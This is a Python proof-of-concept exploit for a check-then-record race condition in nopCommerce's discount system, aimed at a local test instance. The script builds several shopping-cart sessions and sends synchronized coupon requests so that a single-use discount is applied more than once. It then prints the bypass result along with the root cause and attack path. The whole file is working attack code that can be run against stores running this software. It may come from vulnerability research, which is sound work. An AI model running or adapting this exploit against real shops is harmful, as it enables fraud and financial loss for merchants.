#!/usr/bin/env python3
"""
Race Condition PoC for nopCommerce Discount System
TOCTOU vulnerability between discount validation and usage recording
"""

import requests
import threading
import time
import re
import sys
from bs4 import BeautifulSoup

BASE_URL = "http://localhost:8080"
DISCOUNT_CODE = sys.argv[1] if len(sys.argv) > 1 else "123"
NUM_THREADS = 10
PRODUCT_ID = 2  # Digital Storm VANQUISH (no required attributes)
PRODUCT_URL = "/digital-storm-vanquish-custom-performance-pc"


def get_csrf_token(html_content):
    """Extract CSRF token from HTML"""
    match = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', html_content)
    return match.group(1) if match else ""


def create_session_with_cart():
    """Create a session and add product to cart"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    # Get homepage
    response = session.get(BASE_URL)

    # Get product page
    response = session.get(f"{BASE_URL}{PRODUCT_URL}")
    token = get_csrf_token(response.text)

    # Add to cart - POST to /addproducttocart/details/{productId}/1
    add_url = f"{BASE_URL}/addproducttocart/details/{PRODUCT_ID}/1"
    add_data = {
        "__RequestVerificationToken": token,
        f"addtocart_{PRODUCT_ID}.EnteredQuantity": "1"
    }

    response = session.post(add_url, data=add_data, headers={
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded"
    })

    # Verify cart has item
    cart_response = session.get(f"{BASE_URL}/cart")

    return session, "product" in cart_response.text.lower() or "quantity" in cart_response.text.lower()


def apply_discount(session, thread_id, barrier, results):
    """Apply discount code with synchronized barrier"""
    try:
        # Get cart page and token
        cart_url = f"{BASE_URL}/cart"
        cart_response = session.get(cart_url)
        token = get_csrf_token(cart_response.text)

        # Prepare discount application data
        discount_data = {
            "__RequestVerificationToken": token,
            "discountcouponcode": DISCOUNT_CODE,
            "applydiscountcouponcode": "Apply coupon"
        }

        # Wait for all threads at barrier
        print(f"[Thread {thread_id}] Ready at barrier...")
        barrier.wait()

        # Execute discount application - this is the critical race window
        start_time = time.time()
        response = session.post(cart_url, data=discount_data)
        elapsed_ms = (time.time() - start_time) * 1000

        # Analyze response
        response_lower = response.text.lower()
        success = False
        message = "Unknown"

        if "applied" in response_lower or "is applied" in response_lower:
            success = True
            message = "Discount applied successfully"
        elif "cannot be used" in response_lower or "limit" in response_lower:
            message = "Discount limit reached"
        elif "wrong" in response_lower or "invalid" in response_lower:
            message = "Invalid discount code"
        elif "expired" in response_lower:
            message = "Discount expired"
        else:
            # Try to extract actual message from response
            soup = BeautifulSoup(response.text, 'html.parser')
            discount_box = soup.find(class_='message') or soup.find(class_='discount-box')
            if discount_box:
                message = discount_box.get_text(strip=True)[:100]

        results[thread_id] = {
            "success": success,
            "message": message,
            "status_code": response.status_code,
            "elapsed_ms": elapsed_ms
        }

        status = "SUCCESS" if success else "FAILED"
        print(f"[Thread {thread_id}] {status} - {message} ({elapsed_ms:.2f}ms)")

    except Exception as e:
        results[thread_id] = {
            "success": False,
            "message": str(e),
            "status_code": 0,
            "elapsed_ms": 0
        }
        print(f"[Thread {thread_id}] ERROR - {str(e)}")


def check_discount_usage():
    """Check discount usage count from database simulation"""
    # This would normally query the database
    # For now we'll check through repeated API calls
    pass


def main():
    print("=" * 70)
    print("nopCommerce Discount Race Condition PoC")
    print("=" * 70)
    print(f"Target: {BASE_URL}")
    print(f"Discount Code: {DISCOUNT_CODE}")
    print(f"Concurrent Threads: {NUM_THREADS}")
    print(f"Product ID: {PRODUCT_ID}")
    print("=" * 70)
    print()

    # Phase 1: Create sessions with products in cart
    print("[Phase 1] Creating sessions and adding products to cart...")
    sessions = []
    for i in range(NUM_THREADS):
        session, has_cart = create_session_with_cart()
        if has_cart:
            sessions.append(session)
            print(f"    [+] Session {i+1} ready (cart populated)")
        else:
            print(f"    [-] Session {i+1} failed (cart empty)")

    if len(sessions) < 2:
        print("\n[-] Not enough sessions with products in cart")
        print("    Make sure the product exists and is purchasable")
        return 0

    print(f"\n[*] {len(sessions)} sessions ready for race condition test")
    print()

    # Phase 2: Synchronized discount application
    print("[Phase 2] Launching synchronized discount applications...")
    print()

    barrier = threading.Barrier(len(sessions))
    results = {}
    threads = []

    for i, session in enumerate(sessions):
        t = threading.Thread(target=apply_discount, args=(session, i, barrier, results))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Phase 3: Analyze results
    print()
    print("=" * 70)
    print("RESULTS ANALYSIS")
    print("=" * 70)

    success_count = sum(1 for r in results.values() if r.get("success"))
    failed_count = sum(1 for r in results.values() if not r.get("success"))

    print(f"Total Requests: {len(results)}")
    print(f"Successful Applications: {success_count}")
    print(f"Failed Applications: {failed_count}")
    print(f"Discount Limit: 1 (NTimesOnly)")
    print()

    print("Individual Results:")
    for tid in sorted(results.keys()):
        r = results[tid]
        status = "[OK]" if r["success"] else "[--]"
        print(f"  Thread {tid}: {status} {r['message']} ({r['elapsed_ms']:.2f}ms)")

    print()
    print("=" * 70)

    if success_count > 1:
        print("VULNERABILITY CONFIRMED!")
        print("=" * 70)
        print(f"The discount was successfully applied {success_count} times")
        print(f"when the limit was configured to only 1 use.")
        print()
        print("Root Cause Analysis:")
        print("  - DiscountService.cs:556 checks usage count")
        print("  - OrderProcessingService.cs:1440 records usage history")
        print("  - Time window between check and record allows race condition")
        print()
        print("Attack Path:")
        print("  1. Multiple sessions send concurrent requests")
        print("  2. All pass validation before any usage is recorded")
        print("  3. Discount limit is bypassed")
        print()
        print("Impact: Financial loss through unlimited discount usage")
        print("=" * 70)
        return success_count
    elif success_count == 1:
        print("EXPECTED BEHAVIOR")
        print("=" * 70)
        print("Only 1 discount application succeeded (correct behavior)")
        print()
        print("Note: Race condition may still exist but was not")
        print("      exploited in this run. Recommendations:")
        print("  - Increase number of concurrent threads")
        print("  - Run multiple test iterations")
        print("  - Ensure server is under load")
        print("=" * 70)
        return 1
    else:
        print("TEST INCONCLUSIVE")
        print("=" * 70)
        print("No successful discount applications.")
        print()
        print("Possible issues:")
        print("  - Discount code may be invalid")
        print("  - Discount may have expired")
        print("  - Products may not qualify for discount")
        print("  - Cart may be empty")
        print("=" * 70)
        return 0


if __name__ == "__main__":
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        print("Installing beautifulsoup4...")
        import subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", "beautifulsoup4", "-q"])
        from bs4 import BeautifulSoup

    result = main()
    sys.exit(0 if result > 0 else 1)
